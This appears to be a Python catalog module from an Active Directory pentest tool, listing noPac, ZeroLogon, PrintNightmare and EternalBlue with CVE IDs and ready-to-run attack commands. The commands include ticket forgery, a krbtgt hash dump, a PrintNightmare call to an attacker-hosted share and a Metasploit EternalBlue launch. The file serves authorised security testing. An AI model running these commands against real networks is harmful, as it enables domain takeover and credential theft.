from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class CveTechnique:
    key: str
    title: str
    severity: str
    mitre_id: str
    cve_ids: tuple[str, ...]
    summary: str
    manual_commands: tuple[str, ...]
    guide_key: str = "cves_exploit"


CVE_TECHNIQUES: dict[str, CveTechnique] = {
    "nopac": CveTechnique(
        key="nopac",
        title="noPac (sAMAccountName spoof)",
        severity="critical",
        mitre_id="T1068",
        cve_ids=("CVE-2021-42278", "CVE-2021-42287"),
        summary="Forge TGT via DC sAMAccountName mismatch (requires MAQ > 0).",
        manual_commands=(
            "nopac.py <DOMAIN>/user:pass -dc-ip <DC> -dc-host <DCNAME>",
            "sam-the-admin.py <DOMAIN>/user:pass -dc-ip <DC>",
        ),
    ),
    "zerologon": CveTechnique(
        key="zerologon",
        title="ZeroLogon (Netlogon bypass)",
        severity="critical",
        mitre_id="T1210",
        cve_ids=("CVE-2020-1472",),
        summary="Reset DC machine account password via Netlogon RPC.",
        manual_commands=(
            "ADMapper cves exploit zerologon <DC>  # requires explicit confirm",
            "zerologon_tester.py <DCNAME> <DC_IP>",
            "secretsdump.py -just-dc-user krbtgt@<DC> -hashes :<hash>",
        ),
    ),
    "printnightmare": CveTechnique(
        key="printnightmare",
        title="PrintNightmare (Spooler RCE)",
        severity="high",
        mitre_id="T1068",
        cve_ids=("CVE-2021-34527", "CVE-2021-1675"),
        summary="Windows Print Spooler RPC may allow remote code execution.",
        manual_commands=(
            "rpcdump.py <host> | grep -i spooler",
            "nxc smb <host> -M spooler",
            "CVE-2021-1675.py <target> \\\\<attacker>\\\\share",
        ),
    ),
    "eternalblue": CveTechnique(
        key="eternalblue",
        title="MS17-010 EternalBlue",
        severity="critical",
        mitre_id="T1210",
        cve_ids=("CVE-2017-0144",),
        summary="SMBv1 remote code execution on unpatched legacy Windows.",
        manual_commands=(
            "nmap --script smb-vuln-ms17-010 -p445 <host>",
            "nxc smb <host> -M ms17-010",
            "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue'",
        ),
    ),
    "cve_catalog": CveTechnique(
        key="cve_catalog",
        title="CVE catalog entry",
        severity="medium",
        mitre_id="T1210",
        cve_ids=(),
        summary="Known CVE applicable to host OS (may be patched).",
        manual_commands=("ADMapper cves show <id>", "guide cves_exploit"),
    ),
}


def cve_meta(key: str) -> CveTechnique:
    return CVE_TECHNIQUES.get(
        key,
        CveTechnique(
            key=key,
            title=key.replace("_", " ").title(),
            severity="medium",
            mitre_id="T1210",
            cve_ids=(),
            summary=f"CVE technique: {key}",
            manual_commands=("guide cves_exploit",),
        ),
    )
